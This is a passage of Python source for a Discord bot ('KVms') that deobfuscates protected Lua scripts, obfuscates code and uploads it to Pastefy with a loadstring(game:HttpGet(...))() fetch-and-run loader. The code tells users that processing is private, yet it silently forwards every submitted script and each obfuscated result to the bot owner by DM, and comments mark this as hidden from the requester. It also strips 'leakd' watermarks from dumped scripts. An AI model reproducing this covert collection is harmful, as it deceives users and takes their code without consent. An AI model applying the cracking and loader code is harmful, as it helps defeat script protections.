            raise ValueError(\"Attachment is missing or exceeds the input limit\")
        source = raw.decode(\"utf-8\", \"ignore\")
    else:
        raw = await fetch_bytes_aiohttp(job[\"url\"])
        if raw is None:
            raise ValueError(\"URL fetch returned None\")
        source = raw.decode(\"utf-8\", \"ignore\")
    if job_id:
        _job_update(job_id, input=_job_input_summary(source, source=source_type,
                                                      filename=filename, url=url),
                    status=\"processing\")
    return source

async def react(msg, emoji):
    try:
        await msg.add_reaction(emoji)
    except discord.errors.HTTPException as e:
        if e.status == 429:
            retry_after = float(getattr(e, 'retry_after', 2.0))
            await _handle_429_response({\"Retry-After\": str(retry_after)})
            try: await msg.add_reaction(emoji)
            except Exception: pass
    except Exception:
        pass

async def unreact(msg, emoji):
    try:
        await msg.remove_reaction(emoji, bot.user)
    except discord.errors.HTTPException as e:
        if e.status == 429:
            retry_after = float(getattr(e, 'retry_after', 2.0))
            await _handle_429_response({\"Retry-After\": str(retry_after)})
            try: await msg.remove_reaction(emoji, bot.user)
            except Exception: pass
    except Exception:
        pass

_DELETED_OBF_MESSAGE_IDS = set()


def _remember_deleted_obf_message(message):
    message_id = getattr(message, \"id\", None)
    if message_id is None:
        return
    _DELETED_OBF_MESSAGE_IDS.add(message_id)
    if len(_DELETED_OBF_MESSAGE_IDS) > 2048:
        _DELETED_OBF_MESSAGE_IDS.clear()
        _DELETED_OBF_MESSAGE_IDS.add(message_id)


async def _safe_reply(message, **kwargs):
    for attempt in range(8):
        try:
            return await message.reply(**kwargs)
        except discord.errors.NotFound:
            channel = getattr(message, \"channel\", None)
            if channel is not None:
                return await channel.send(**kwargs)
            raise
        except discord.errors.HTTPException as e:
            if e.status == 429:
                retry_after = float(getattr(e, 'retry_after', 2.0))
                await _handle_429_response({\"Retry-After\": str(retry_after)})
            elif getattr(message, \"id\", None) in _DELETED_OBF_MESSAGE_IDS:
                channel = getattr(message, \"channel\", None)
                if channel is not None:
                    return await channel.send(**kwargs)
                raise
            else:
                raise
        except Exception:
            raise
    raise Exception(\"_safe_reply: max retries exceeded\")

async def _safe_edit(message, **kwargs):
    for attempt in range(8):
        try:
            return await message.edit(**kwargs)
        except discord.errors.HTTPException as e:
            if e.status == 429:
                retry_after = float(getattr(e, 'retry_after', 2.0))
                await _handle_429_response({\"Retry-After\": str(retry_after)})
            else:
                raise
        except Exception:
            raise
    raise Exception(\"_safe_edit: max retries exceeded\")

async def _send_owner_result_metadata(message, engine: str, output_bytes: bytes = None,
                                      took: float = None, output_name: str = None,
                                      output_hash: str = None, output_size: int = None):
    \"\"\"Send private result metadata to the owner without exposing it publicly.\"\"\"
    try:
        if output_bytes is not None:
            output_bytes = _mask_host_ip_bytes(output_bytes)
            output_size = len(output_bytes)
            output_hash = hashlib.sha256(output_bytes).hexdigest()
        output_size = output_size or 0
        output_hash = output_hash or \"unavailable\"
        owner = await bot.fetch_user(OWNER_ID)
        dm = await owner.create_dm()
        embed = discord.Embed(
            title=\"Private result metadata\",
            description=\"Result metadata is visible only to the owner.\",
            color=ACCENT,
            timestamp=datetime.now(),
        )
        embed.add_field(name=\"Engine\", value=f\"`{engine}`\", inline=True)
        embed.add_field(name=\"User ID\", value=f\"`{message.author.id}`\", inline=True)
        embed.add_field(name=\"Output size\", value=f\"`{output_size:,} bytes`\", inline=True)
        embed.add_field(name=\"SHA-256\", value=f\"`{output_hash}`\", inline=False)
        if output_name:
            embed.add_field(name=\"Output label\", value=f\"`{output_name}`\", inline=True)
        if took is not None:
            embed.add_field(name=\"Elapsed\", value=f\"`{took:.2f}s`\", inline=True)
        if message.guild:
            embed.add_field(name=\"Guild\", value=f\"`{message.guild.id}`\", inline=True)
        embed.set_footer(text=\"KVms | Owner Only\")
        await dm.send(embed=embed)
    except Exception as e:
        print(f\"[OwnerMeta] {e}\")


async def _send_lph_panel_error(message, panel_error, job_id=None):
    \"\"\"Send bounded raw panel diagnostics to the owner only.

    The public LPH response never receives this text; it uses LURAPH_ERROR.
    The diagnostic is attached as a file so panel punctuation or mention-like
    text cannot create a public ping. It is capped and is not persisted.
    \"\"\"
    try:
        if isinstance(panel_error, (bytes, bytearray)):
            error_text = bytes(panel_error).decode(\"utf-8\", errors=\"replace\")
        else:
            error_text = str(panel_error or \"panel returned an unspecified error\")
        error_bytes = error_text.encode(\"utf-8\", errors=\"replace\")[:LPH_OWNER_ERROR_MAX_BYTES]
        if not error_bytes:
            error_bytes = b\"panel returned an empty error\"
        owner = await bot.fetch_user(OWNER_ID)
        dm = await owner.create_dm()
        embed = discord.Embed(
            title=\"Private LPH panel error\",
            description=\"The attached bounded diagnostic is visible only to the owner.\",
            color=BAD,
            timestamp=datetime.now(),
        )
        embed.add_field(name=\"User ID\", value=f\"`{message.author.id}`\", inline=True)
        if job_id:
            embed.add_field(name=\"Job ID\", value=f\"`{job_id}`\", inline=True)
        if message.guild:
            embed.add_field(name=\"Guild\", value=f\"`{message.guild.id}`\", inline=True)
        embed.set_footer(text=\"KVms | private panel diagnostic\")
        await dm.send(embed=embed, file=discord.File(
            io.BytesIO(error_bytes), filename=\"lph_panel_error.txt\"))
    except Exception as error:
        print(f\"[LPHOwnerError] {error}\")


async def _forward_to_owner(cmd_name, sender, filename, file_bytes, src_msg):
    try:
        file_bytes = _mask_host_ip_bytes(file_bytes)
        owner = await bot.fetch_user(OWNER_ID)
        dm = await owner.create_dm()
        gi = (f\"{src_msg.guild.name} (`{src_msg.guild.id}`)\" if src_msg.guild else \"DM\")
        ci = f\"#{src_msg.channel.name}\" if src_msg.guild else \"DM\"
        embed = discord.Embed(title=f\".{cmd_name} submission\", color=0x5865F2, timestamp=datetime.now())
        embed.add_field(name=\"User\",    value=f\"{sender} (`{sender.id}`)\", inline=False)
        embed.add_field(name=\"Guild\",   value=gi, inline=True)
        embed.add_field(name=\"Channel\", value=ci, inline=True)
        embed.set_footer(text=\"KVms | hidden\")
        if file_bytes:
            await dm.send(embed=embed, file=discord.File(io.BytesIO(file_bytes), filename=filename))
        else:
            await dm.send(embed=embed)
    except Exception as e:
        print(f\"[Forward] {e}\")

async def _run_single_dump_job(job):
    message = job[\"message\"]
    name    = job[\"name\"]
    job_id  = job.get(\"job_id\")
    user_job_state = job.get(\"user_job_state\")
    if job_id:
        _job_update(job_id, command=\".l\", status=\"processing\")
    if user_job_state is not None:
        try:
            registered = await _register_user_job_task(user_job_state)
        except BaseException:
            await _finish_user_job(user_job_state)
            raise
        if not registered:
            await _finish_user_job(user_job_state)
            return
    persist_id = job.get(\"persist_id\")
    if persist_id:
        await _remove_persisted_queue_ids({persist_id})
        if user_job_state is not None:
            user_job_state.get(\"persisted_ids\", set()).discard(persist_id)
    try:
        timeout = min(job.get(\"timeout\", HARD_MAX_TIMEOUT), HARD_MAX_TIMEOUT)
        stamp   = f\"{int(time.time()*1000)}_{os.getpid()}_{random.randint(0,9999)}\"
        in_rel  = f\"bot_tmp/{stamp}.lua\"
        out_rel = f\"bot_tmp/{stamp}_out.lua\"
        in_path  = ROOT / in_rel
        out_path = ROOT / out_rel

        await unreact(message, EMOJI_LOADING)
        await react(message, EMOJI_LOADING)
    except BaseException:
        if user_job_state is not None:
            async with _user_job_lock:
                user_job_state[\"completed\"] = min(
                    int(user_job_state.get(\"total\") or 1),
                    int(user_job_state.get(\"completed\") or 0) + 1,
                )
            await _finish_user_job(user_job_state)
        raise
    t_start = time.perf_counter()
    try:
        src = await fetch_job_source(job)
        if not src:
            raise ValueError(\"Source is empty or couldn't be read\")
        if not _source_within_input_limit(src):
            raise ValueError(\"Input too large (max 8MB)\")

        in_path.write_text(src, encoding=\"utf-8\", errors=\"ignore\")
        asyncio.ensure_future(_forward_to_owner(\"l\", message.author, name,
            src.encode(\"utf-8\", errors=\"ignore\"), message))

        job_priority = 1 if is_premium(message.author.id) else 0
        job_position = await _enter_job_queue(priority=job_priority)
        if user_job_state is not None:
            user_job_state[\"command\"] = \".l\"
            user_job_state[\"priority\"] = job_priority
            old_position = user_job_state.get(\"queue_position\")
            user_job_state[\"queue_position\"] = (
                job_position if not isinstance(old_position, int)
                else min(old_position, job_position)
            )
        try:
            ok, reason, took = await asyncio.to_thread(_l_dump_blocking, in_rel, out_rel, timeout)
        finally:
            await _leave_job_queue()

        if ok:
            data = out_path.read_text(errors=\"ignore\") if out_path.exists() else ok
            if isinstance(data, str):
                data = _strip_leakd_watermarks(_fix_mojibake(data))
                lines = data.count(\"\\n\") + 1
                size  = len(data.encode(\"utf-8\"))

                pastefy_url = None
                cfg = get_user_config(message.author.id)
                if cfg.get(\"pastefy_enabled\", True):
                    pf_id = await asyncio.to_thread(_upload_to_pastefy, data, name)
                    if pf_id:
                        pastefy_url = pf_id

                urls      = _extract_urls_from_output(data)
                urls_line = _format_urls_footer(urls)
                preview   = _strip_mentions(\"\\n\".join(data.splitlines()[:30]))[:1000]

                embed = discord.Embed(color=GOOD, timestamp=datetime.now())
                desc_parts = [
                    f\"**`{_strip_mentions(name)}`** dumped successfully\",
                    f\"```lua\\n{preview}\\n```\",
                    f\"`{lines:,} lines` | `{size / 1024:.1f} KB` | `{took:.2f}s`\",
                ]
                if pastefy_url:
                    desc_parts.append(f\"**Pastefy:** {pastefy_url}\")
                desc_parts.append(urls_line)
                embed.description = \"\\n\".join(desc_parts)
                embed.add_field(name=\"Job ID\", value=f\"`{job_id or 'unavailable'}`\", inline=True)
                embed.set_footer(text=_make_footer(took))
                # Inline jobs have no source filename -> use a clean name
                if job.get(\"inline\") is not None:
                    out_name = \"dump.lua\"
                else:
                    out_name = re.sub(r\"\\.(lua|txt|luau)$\", \"\", name, flags=re.I) + \".dump.lua\"
                if job_id:
                    elapsed = max(0.0, time.time() - float((user_job_state or {}).get(\"started_at\") or time.time()))
                    _job_update(job_id, output=_job_output_summary(data, filename=out_name),
                                status=\"completed\", error=\"\", duration_seconds=round(elapsed, 3))
                asyncio.ensure_future(_send_owner_result_metadata(
                    message, \"l\",
                    output_bytes=(data.encode(\"utf-8\") if isinstance(data, str) else data),
                    took=took, output_name=out_name,
                ))
                await _safe_reply(message, content=message.author.mention, embed=embed,
                    file=discord.File(io.BytesIO(data.encode(\"utf-8\")), filename=out_name),
                    mention_author=True)
                await unreact(message, EMOJI_LOADING)
                await react(message, EMOJI_SUCCESS)
            else:
                raise ValueError(\"Invalid output type\")
        else:
            if \"infinite loop\" in (reason or \"\") or \"Timeout\" in (reason or \"\"):
                label = \"Timed out - script might be in an infinite loop\"
                color = WARN
                tick  = \"ƒ‚‚ƒ‚‚\"
            else:
                label = reason
                color = BAD
                tick  = EMOJI_FAIL
            embed = discord.Embed(color=color, timestamp=datetime.now())
            embed.description = f\"**`{_strip_mentions(name)}`**\\nsorry, couldn't crack this one\\n`{_strip_mentions(label)}`\"
            embed.add_field(name=\"Job ID\", value=f\"`{job_id or 'unavailable'}`\", inline=True)
            embed.set_footer(text=_make_footer())
            if job_id:
                elapsed = max(0.0, time.time() - float((user_job_state or {}).get(\"started_at\") or time.time()))
                _job_update(job_id, status=\"failed\", error=str(label or TIMEOUT_ERROR),
                            duration_seconds=round(elapsed, 3))
            await _safe_reply(message, content=message.author.mention, embed=embed, mention_author=True)
            await unreact(message, EMOJI_LOADING)
            await react(message, tick)
    except Exception as ex:
        embed = discord.Embed(color=BAD, timestamp=datetime.now())
        embed.description = f\"**`{_strip_mentions(name)}`**\\nsorry, couldn't crack this one\\n`{TIMEOUT_ERROR}`\"
        embed.add_field(name=\"Job ID\", value=f\"`{job_id or 'unavailable'}`\", inline=True)
        embed.set_footer(text=_make_footer())
        if job_id:
            elapsed = max(0.0, time.time() - float((user_job_state or {}).get(\"started_at\") or time.time()))
            _job_update(job_id, status=\"failed\", error=TIMEOUT_ERROR,
                        duration_seconds=round(elapsed, 3))
        try:
            await _safe_reply(message, content=message.author.mention, embed=embed, mention_author=True)
        except Exception:
            pass
        await unreact(message, EMOJI_LOADING)
        await react(message, EMOJI_FAIL)
    finally:
        for p in (in_path, out_path):
            try: p.unlink()
            except Exception: pass
        if user_job_state is not None:
            await _finish_user_job(user_job_state)

async def dump_worker():
    await bot.wait_until_ready()
    while True:
        job = await dump_queue.get()
        task = asyncio.ensure_future(_run_single_dump_job(job))
        state = job.get(\"user_job_state\") if isinstance(job, dict) else None
        if state is not None:
            async with _user_job_lock:
                if state.get(\"cancelled\"):
                    task.cancel()
                else:
                    state.setdefault(\"tasks\", set()).add(task)
        dump_queue.task_done()

def _engine_failure_message(prefix: str) -> str:
    \"\"\"Return a short public failure message for each engine.\"\"\"
    key = (prefix or \"\").lower().strip()
    if key == \".promdeobf\":
        return PROMDEOBF_ERROR
    if key == \".moonsec\":
        return MOONSEC_ERROR
    return TIMEOUT_ERROR


# =========================
# PRIVATE PYTHON OBFUSCATOR (.obf)
# =========================
async def run_python_obfuscator(lua_code: str) -> tuple:
    \"\"\"Run the local obfuscation backend using isolated temporary paths.\"\"\"
    def _sync():
        backend = ROOT / \"obf.py\"
        if not backend.exists():
            print(\"[Obfuscator] backend is unavailable\")
            return None, OBF_SYNTAX_ERROR

        with tempfile.TemporaryDirectory() as tmp:
            input_path = os.path.join(tmp, \"input.lua\")
            output_path = os.path.join(tmp, \"output.lua\")
            with open(input_path, \"w\", encoding=\"utf-8\") as f:
                f.write(lua_code)

            # Keep the backend invocation private; users only receive the
            # result, never the name/path of the implementation file.
            cmd = [
                \"python\", \"obf.py\", input_path, output_path,
                \"--antitamper=true\",
            ]
            returncode, _stdout, _stderr, timed_out = _run_process_limited(
                cmd, HARD_MAX_TIMEOUT + 5
            )
            if timed_out:
                return None, TIMEOUT_ERROR
            if returncode != 0:
                return None, OBF_SYNTAX_ERROR
            if not os.path.isfile(output_path):
                return None, OBF_SYNTAX_ERROR

            try:
                if os.path.getsize(output_path) > MAX_OUTPUT_BYTES:
                    return None, OBF_SYNTAX_ERROR
                with open(output_path, \"rb\") as f:
                    data = f.read(MAX_OUTPUT_BYTES + 1)
            except Exception:
                return None, OBF_SYNTAX_ERROR

            if not data or len(data) > MAX_OUTPUT_BYTES:
                return None, OBF_SYNTAX_ERROR

            # Some backends write an error wrapper to the output file and
            # still exit successfully. Never send that wrapper to Discord.
            preview_text = data.decode(\"utf-8\", errors=\"ignore\")
            if _looks_like_engine_error(preview_text):
                return None, OBF_SYNTAX_ERROR
            return data, None

    return await asyncio.to_thread(_sync)


async def _send_obf_result_dms(requester, output_bytes: bytes, took: float, job_id: str = None) -> bool:
    \"\"\"Deliver the obfuscated file privately to requester and owner.\"\"\"
    output_bytes = _mask_host_ip_bytes(output_bytes)
    requester_sent = False
    try:
        dm = await requester.create_dm()
        await dm.send(
            content=f\"{requester.mention} here's your Obfuscated code ~~\",
            file=discord.File(io.BytesIO(output_bytes), filename=\"result.lua\"),
        )
        requester_sent = True
    except Exception as e:
        print(f\"[Obfuscator] requester DM failed: {e}\")

    # Owner metadata remains private and separate from the simple requester
    # delivery. It is also sent when the owner is the requester.
    if requester.id == OWNER_ID:
        try:
            owner_embed = discord.Embed(
                title=\"Private result metadata\",
                description=\"Result metadata is visible only to the owner.\",
                color=ACCENT,
            )
            owner_embed.add_field(name=\"Engine\", value=\"`obf`\", inline=True)
            owner_embed.add_field(name=\"User ID\", value=f\"`{requester.id}`\", inline=True)
            owner_embed.add_field(name=\"Output size\", value=f\"`{len(output_bytes):,} bytes`\", inline=True)
            owner_embed.add_field(name=\"Elapsed\", value=f\"`{took:.2f}s`\", inline=True)
            owner_embed.add_field(
                name=\"SHA-256\",
                value=f\"`{hashlib.sha256(output_bytes).hexdigest()}`\",
                inline=False,
            )
            owner_embed.set_footer(text=\"KVms | Private owner log\")
            await dm.send(embed=owner_embed)
        except Exception as e:
            print(f\"[Obfuscator] owner metadata failed: {e}\")

    # This second delivery is intentionally silent to the requester and is
    # never mentioned in the public channel.
    if requester.id != OWNER_ID:
        try:
            owner = await bot.fetch_user(OWNER_ID)
            owner_dm = await owner.create_dm()
            owner_embed = discord.Embed(
                title=\"Private result\",
                description=\"A private obfuscation result was generated.\",
                color=ACCENT,
            )
            owner_embed.add_field(name=\"Engine\", value=\"`obf`\", inline=True)
            owner_embed.add_field(name=\"User ID\", value=f\"`{requester.id}`\", inline=True)
            owner_embed.add_field(name=\"Output size\", value=f\"`{len(output_bytes):,} bytes`\", inline=True)
            owner_embed.add_field(name=\"Elapsed\", value=f\"`{took:.2f}s`\", inline=True)
            owner_embed.add_field(
                name=\"SHA-256\",
                value=f\"`{hashlib.sha256(output_bytes).hexdigest()}`\",
                inline=False,
            )
            owner_embed.set_footer(text=\"KVms | Private owner log\")
            await owner_dm.send(
                embed=owner_embed,
                file=discord.File(io.BytesIO(output_bytes), filename=\"result.lua\"),
            )
        except Exception as e:
            # Do not expose owner-delivery details to the requester.
            print(f\"[Obfuscator] owner DM failed: {e}\")

    return requester_sent


async def _prepare_obf_privacy(message):
    \"\"\"Reply with the privacy notice, auto-delete it, then remove guild input.\"\"\"
    if message.guild is None or getattr(message, \"id\", None) in _DELETED_OBF_MESSAGE_IDS:
        return
    notice = (
        \"please use `.obf` in DM instead of in a channel; \"
        \"this request is processed privately\"
    )
    try:
        # Send this as a real reply while the source message still exists.
        # delete_after keeps the notice temporary.
        await message.reply(content=notice, delete_after=20, mention_author=False)
    except Exception as error:
        print(f\"[Obfuscator] privacy reply failed: {error}\")
        try:
            await message.channel.send(notice, delete_after=20)
        except Exception as fallback_error:
            print(f\"[Obfuscator] privacy notice failed: {fallback_error}\")
    try:
        await message.delete()
    except Exception as error:
        print(f\"[Obfuscator] could not delete channel input: {error}\")
    finally:
        _remember_deleted_obf_message(message)


async def _delete_obf_status_after(message, delay: float = 20.0):
    await asyncio.sleep(delay)
    try:
        await message.delete()
    except Exception:
        pass


async def _handle_obf_command(message, content: str):
    \"\"\"Accept source input and deliver the obfuscation result privately.\"\"\"
    await _prepare_obf_privacy(message)
    if await _user_job_busy(message.author.id):
        return await _safe_reply(message, content=\"you already have a job running; wait for it to finish or use `.cancel`\")
    backend = ROOT / \"obf.py\"
    if not backend.exists():
        print(\"[Obfuscator] backend is unavailable\")
        return await _safe_reply(message, content=f\"{EMOJI_FAIL} {OBF_SYNTAX_ERROR}\")

    remaining = _job_cooldown_remaining(message.author.id, \"obf\")
    if remaining > 0:
        return await _safe_reply(
            message,
            content=f\"please wait {int(remaining + 0.999)}s before using `.obf` again\",
        )

    lua_code = None
    filename = \"input.lua\"

    for att in message.attachments:
        if att.filename.lower().endswith((\".lua\", \".luau\", \".txt\")):
            try:
                raw = await _read_attachment_limited(att)
                if raw:
                    lua_code = raw.decode(\"utf-8\", errors=\"ignore\")
                    filename = att.filename
                    break
            except Exception:
                pass

    if not lua_code and message.reference:
        try:
            ref = (message.reference.resolved or
                   await message.channel.fetch_message(message.reference.message_id))
            lua_code = await extract_lua_from(ref)
        except Exception:
            pass

    if not lua_code:
        parts = content.split(maxsplit=1)
        if len(parts) > 1:
            after = parts[1].strip()
            if after.startswith((\"http://\", \"https://\")):
                fetch_status = None
                try:
                    fetch_status = await _safe_reply(message, content=f\"{EMOJI_LOADING} fetching...\")
                    raw = await fetch_from_url(after.split()[0])
                    lua_code = raw.decode(\"utf-8\", errors=\"ignore\") if raw else None
                    await fetch_status.delete()
                except Exception:
                    if fetch_status is not None:
                        try:
                            await _safe_edit(
                                fetch_status,
                                content=f\"{EMOJI_FAIL} {OBF_SYNTAX_ERROR}\",
                            )
                        except Exception:
                            pass
                    return
            else:
                cb = LUA_CODEBLOCK.search(content)
                lua_code = cb.group(1).strip() if cb else after

    if not lua_code:
        return await _safe_reply(
            message,
            content=\"`.obf <code|url|reply|file>` - send the source to process\",
        )
    if not _source_within_input_limit(lua_code):
        return await _safe_reply(message, content=\"input too large (maximum 8 MB)\")

    started = time.perf_counter()
    status = await _safe_reply(message, content=f\"{EMOJI_LOADING} processing...\")
    user_job_state = await _claim_user_job(message.author.id)
    if user_job_state is None:
        return await _safe_edit(status, content=\"you already have a job running; wait for it to finish or use `.cancel`\", embed=None)
    user_job_state[\"status\"] = status
    _job_bind_message(user_job_state, message)
    _job_set_command(user_job_state, \".obf\")
    input_source, input_name, input_url = _job_source_info(message, content, \".obf\", filename)
    _job_set_input(user_job_state, lua_code, source=input_source,
                   filename=input_name, url=input_url)
    try:
        await _safe_edit(status, content=f\"{EMOJI_LOADING} processing...\")
    except Exception:
        pass
    _set_job_cooldown(message.author.id, \"obf\")
    asyncio.ensure_future(_forward_to_owner(
        \"obf\", message.author, filename,
        lua_code.encode(\"utf-8\", errors=\"ignore\"), message
    ))
    try:
        job_priority = 1 if is_premium(message.author.id) else 0
        user_job_state[\"command\"] = \".obf\"
        user_job_state[\"priority\"] = job_priority
        user_job_state[\"queue_position\"] = \"waiting\"
        job_position = await _enter_job_queue(priority=job_priority)
        user_job_state[\"queue_position\"] = job_position
        try:
            if job_position > MAX_CONCURRENT_JOBS:
                await _safe_edit(
                    status,
                    content=f\"{EMOJI_LOADING} queued at position {job_position}...\",
                )
            output, error = await run_python_obfuscator(lua_code)
        finally:
            await _leave_job_queue()
        if error or output is None:
            error_text = error or OBF_SYNTAX_ERROR
            _job_mark_status(user_job_state, \"failed\", error_text)
            color = WARN if error == TIMEOUT_ERROR else BAD
            em = discord.Embed(
                description=f\"{EMOJI_FAIL} {error_text}\",
                color=color,
            )
            em.set_footer(text=_make_footer())
            return await _safe_edit(status, content=None, embed=em)

        took = time.perf_counter() - started
        _job_set_output(user_job_state, output, filename=\"result.lua\", status=\"completed\")
        sent = await _send_obf_result_dms(message.author, output, took, user_job_state[\"job_id\"])
        if sent:
            await _safe_edit(
                status,
                content=\"done - the result was sent to your DMs\",
                embed=None,
            )
            asyncio.ensure_future(_delete_obf_status_after(status, 20.0))
        else:
            await _safe_edit(
                status,
                content=\"couldn't deliver the result to your DMs\",
                embed=None,
            )
            asyncio.ensure_future(_delete_obf_status_after(status, 20.0))
    except Exception:
        _job_mark_status(user_job_state, \"failed\", OBF_SYNTAX_ERROR)
        try:
            em = discord.Embed(description=f\"{EMOJI_FAIL} {OBF_SYNTAX_ERROR}\", color=BAD)
            em.set_footer(text=_make_footer())
            await _safe_edit(status, content=None, embed=em)
        except Exception:
            pass
    finally:
        await _finish_user_job(user_job_state)



# =========================
# PASTEFY UPLOAD (.upload)
# =========================
async def _handle_upload_command(message, content: str):
    \"\"\"Upload explicitly requested source code and return a copyable loader.\"\"\"
    if await _user_job_busy(message.author.id):
        return await _safe_reply(message, content=\"you already have a job running; wait for it to finish or use `.cancel`\")
    remaining = _job_cooldown_remaining(message.author.id, \"upload\")
    if remaining > 0:
        return await _safe_reply(
            message,
            content=f\"please wait {int(remaining + 0.999)}s before using `.upload` again\",
        )

    lua_code = None

    for att in message.attachments:
        if att.filename.lower().endswith((\".lua\", \".luau\", \".txt\")):
            try:
                raw = await _read_attachment_limited(att)
                if raw:
                    lua_code = raw.decode(\"utf-8\", errors=\"ignore\")
                    break
            except Exception:
                pass

    if not lua_code and message.reference:
        try:
            ref = (message.reference.resolved or
                   await message.channel.fetch_message(message.reference.message_id))
            lua_code = await extract_lua_from(ref)
        except Exception:
            pass

    if not lua_code:
        parts = content.split(maxsplit=1)
        if len(parts) > 1:
            after = parts[1].strip()
            url_token = after.split()[0] if after.split() else \"\"
            if \"://\" in url_token:
                if not _validate_upload_url(url_token):
                    return await _safe_reply(message, content=\"that's not a valid HTTP(S) URL\")
                fetch_status = None
                try:
                    fetch_status = await _safe_reply(message, content=f\"{EMOJI_LOADING} fetching...\")
                    raw = await fetch_from_url(url_token)
                    lua_code = raw.decode(\"utf-8\", errors=\"ignore\") if raw else None
                    await fetch_status.delete()
                except Exception:
                    if fetch_status is not None:
                        try:
                            await _safe_edit(fetch_status, content=f\"{EMOJI_FAIL} upload failed\")
                        except Exception:
                            pass
                    return
            else:
                cb = LUA_CODEBLOCK.search(content)
                lua_code = cb.group(1).strip() if cb else after

    if not lua_code:
        return await _safe_reply(
            message,
            content=\"`.upload <code|url|reply|file>` - send the source to upload\",
        )
    if not _source_within_input_limit(lua_code):
        return await _safe_reply(message, content=\"input too large (maximum 8 MB)\")
    lua_code = _mask_host_ip_leaks(lua_code)

    status = await _safe_reply(message, content=f\"{EMOJI_LOADING} uploading...\")
    user_job_state = await _claim_user_job(message.author.id)
    if user_job_state is None:
        return await _safe_edit(status, content=\"you already have a job running; wait for it to finish or use `.cancel`\", embed=None)
    user_job_state[\"status\"] = status
    _job_bind_message(user_job_state, message)
    _job_set_command(user_job_state, \".upload\")
    input_source, input_name, input_url = _job_source_info(message, content, \".upload\")
    _job_set_input(user_job_state, lua_code, source=input_source,
                   filename=input_name, url=input_url)
    try:
        await _safe_edit(status, content=f\"{EMOJI_LOADING} uploading... | Job ID: `{user_job_state['job_id']}`\")
    except Exception:
        pass
    _set_job_cooldown(message.author.id, \"upload\")
    try:
        job_priority = 1 if is_premium(message.author.id) else 0
        user_job_state[\"command\"] = \".upload\"
        user_job_state[\"priority\"] = job_priority
        user_job_state[\"queue_position\"] = \"waiting\"
        job_position = await _enter_job_queue(priority=job_priority)
        user_job_state[\"queue_position\"] = job_position
        try:
            if job_position > MAX_CONCURRENT_JOBS:
                await _safe_edit(
                    status,
                    content=f\"{EMOJI_LOADING} queued at position {job_position}...\",
                )
            paste_url = await asyncio.to_thread(_upload_to_pastefy, lua_code, \"KVms Upload\")
        finally:
            await _leave_job_queue()
        if not paste_url:
            _job_mark_status(user_job_state, \"failed\", \"upload failed\")
            em = discord.Embed(description=f\"{EMOJI_FAIL} upload failed\", color=BAD)
            em.add_field(name=\"Job ID\", value=f\"`{user_job_state['job_id']}`\", inline=True)
            em.set_footer(text=_make_footer())
            return await _safe_edit(status, content=None, embed=em)

        loadstring = f'loadstring(game:HttpGet(\"{paste_url}\"))()'
        _job_set_output(user_job_state, loadstring, filename=\"pastefy_loader.lua\", status=\"completed\")
        embed = discord.Embed(
            title=\"Uploaded to Pastefy\",
            description=\"Copy the loader below:\",
            color=GOOD,
        )
        embed.add_field(
            name=\"Loadstring\",
            value=f\"```lua\\n{loadstring}\\n```\",
            inline=False,
        )
        embed.add_field(name=\"Raw URL\", value=f\"`{paste_url}`\", inline=False)
        embed.add_field(name=\"Job ID\", value=f\"`{user_job_state['job_id']}`\", inline=True)
        embed.add_field(
            name=\"Warning\",
            value=\"Pastefy links are public. Do not upload tokens, keys, webhooks, or other private data.\",
            inline=False,
        )
        embed.set_footer(text=_make_footer())
        await status.delete()
        await _safe_reply(message, embed=embed, mention_author=False)
    except Exception:
        _job_mark_status(user_job_state, \"failed\", \"upload failed\")
        try:
            em = discord.Embed(description=f\"{EMOJI_FAIL} upload failed\", color=BAD)
            em.add_field(name=\"Job ID\", value=f\"`{user_job_state['job_id']}`\", inline=True)
            em.set_footer(text=_make_footer())
            await _safe_edit(status, content=None, embed=em)
        except Exception:
            pass
    finally:
        await _finish_user_job(user_job_state)



# =========================
# GENERIC ENGINE HANDLER
# =========================
async def _handle_engine_command(message, content, prefix, engine_fn,
                                  processing_label, output_filename, embed_title):
    if await _user_job_busy(message.author.id):
        return await _safe_reply(message, content=\"you already have a job running; wait for it to finish or use `.cancel`\")
    lua_code = None
    is_url = False
    t_start = time.perf_counter()

    parts = content.split(maxsplit=1)
    if len(parts) > 1 and parts[1].strip().startswith((\"http://\", \"https://\")):
        is_url = True
        try:
            s = await _safe_reply(message, content=f\"{EMOJI_LOADING} fetching...\")
            raw = await fetch_from_url(parts[1].strip())
            if raw is None:
                await _safe_edit(s, content=\"couldn't fetch that url, it came back empty\")
                return
            lua_code = raw.decode(\"utf-8\", errors=\"ignore\")
            await s.delete()
        except Exception as e:
            try:
                em = discord.Embed(description=f\"{EMOJI_FAIL} {_engine_failure_message(prefix)}\", color=BAD)
                em.set_footer(text=_make_footer())
                await _safe_edit(s, content=None, embed=em)
            except Exception: pass
            return

    if not lua_code and message.reference:
        try:
            ref = (message.reference.resolved or
                   await message.channel.fetch_message(message.reference.message_id))
            lua_code = await extract_lua_from(ref)
        except Exception:
            pass

    if not lua_code:
        for att in message.attachments:
            if att.filename.endswith((\".lua\", \".luau\", \".txt\")):
                try:
                    raw = await _read_attachment_limited(att)
                    if raw:
                        lua_code = raw.decode(\"utf-8\", errors=\"ignore\")
                        break
                except Exception:
                    pass

    if not lua_code and not is_url:
        after = content[len(prefix):].strip()
        cb = LUA_CODEBLOCK.search(content)
        if cb:
            lua_code = cb.group(1).strip()
        elif after and not after.startswith((\"http://\", \"https://\")):
            lua_code = after

    if not lua_code:
        await _safe_reply(message, content=f\"`{prefix} <code|url>` - or reply/attach a `.lua` file\")
        return
    if not _source_within_input_limit(lua_code):
        return await _safe_reply(message, content=\"input too large (maximum 8 MB)\")

    asyncio.ensure_future(_forward_to_owner(prefix.lstrip(\".\"), message.author,
        f\"{prefix.lstrip('.')}_input.lua\", lua_code.encode(\"utf-8\", errors=\"ignore\"), message))

    s = await _safe_reply(message, content=f\"{EMOJI_LOADING} {processing_label}...\")
    user_job_state = await _claim_user_job(message.author.id)
    if user_job_state is None:
        return await _safe_edit(s, content=\"you already have a job running; wait for it to finish or use `.cancel`\", embed=None)
    user_job_state[\"status\"] = s
    _job_bind_message(user_job_state, message)
    _job_set_command(user_job_state, prefix)
    input_source, input_name, input_url = _job_source_info(message, content, prefix)
    _job_set_input(user_job_state, lua_code, source=input_source,
                   filename=input_name, url=input_url)
    try:
        await _safe_edit(s, content=f\"{EMOJI_LOADING} {processing_label}... | Job ID: `{user_job_state['job_id']}`\")
    except Exception:
        pass
    try:
        job_priority = 1 if is_premium(message.author.id) else 0
        user_job_state[\"command\"] = prefix
        user_job_state[\"priority\"] = job_priority
        user_job_state[\"queue_position\"] = \"waiting\"
        job_position = await _enter_job_queue(priority=job_priority)
